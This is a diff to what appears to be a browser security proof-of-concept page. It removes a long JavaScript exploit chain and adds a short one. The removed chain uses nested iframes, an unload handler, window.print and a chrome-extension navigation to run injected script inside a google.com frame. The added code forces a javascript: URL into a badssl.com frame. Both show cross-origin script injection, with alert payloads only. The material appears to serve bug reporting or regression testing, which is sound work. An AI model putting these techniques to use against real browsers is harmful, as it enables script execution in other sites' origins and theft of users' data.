@@ -1,62 +1,6 @@
 <script>
-runAsync = func => chrome.runtime.sendMessage("a", "", {}, func);
-
-waitForWindow = (window, accessible, func) => {
-    var doc;
-    try { doc = window.document } catch (e) { }
-    accessible == !!doc ? func() : runAsync(waitForWindow.bind(null, window, accessible, func));
-} 
-
-document.onclick = function () {
-    document.onclick = null;
-
-    wnd = open("", "", "width=1,height=1");
-    wnd.moveTo(10000, 10000);
-
-    frame = document.body.appendChild(document.createElement("iframe"));
-    frame.contentWindow.name = "xxx";
-
-    frame2 = frame.contentWindow.document.body.appendChild(document.createElement("iframe"));
-    frame2.contentWindow.onunload = function() {
-        frame2.contentWindow.onunload = null;
-
-        runAsync(() => {
-            a = document.createElement("a");
-            a.href = "chrome-extension://mhjfbmdgcfjbbpaeojofohoefgiehjai/index.html";
-            a.target = "xxx";
-            a.click();
-
-            waitForWindow(frame.contentWindow, false, function () {
-                wnd.close();
-            })
-        });
-
-        wnd.print();
-    }
-    frame.remove();
-
-    frame.contentWindow.location = "about:blank";
-    frame.onload = function () {
-        frame.contentWindow.location = "https://www.google.com/services/";
-
-        frame.onload = function() {
-            frame.onload = null;
-
-            frame3 = document.body.appendChild(document.createElement("iframe"));
-            frame3.srcdoc = "<b><p><iframe src='javascript:top.insertFrame(frameElement)'></iframe></b></p>";
-
-            var count = 0;
-            insertFrame = function (element) {
-                if (++count != 1)
-                    return;
-                var parent = element.parentNode;
-                element.remove();
-                parent.remove();
-                parent.appendChild(frame);
-                frame.src = "javascript:alert(document.documentElement.innerHTML)";
-            }
-        }
-    }
-}
+i = document.body.appendChild(document.createElement("iframe"));
+f = i.contentWindow.eval('(function(){location="javascript:alert(location)"})');
+i.src = "https://mixed.badssl.com";
+i.onload = f;
 </script>
-<h1>Click to start</h1>
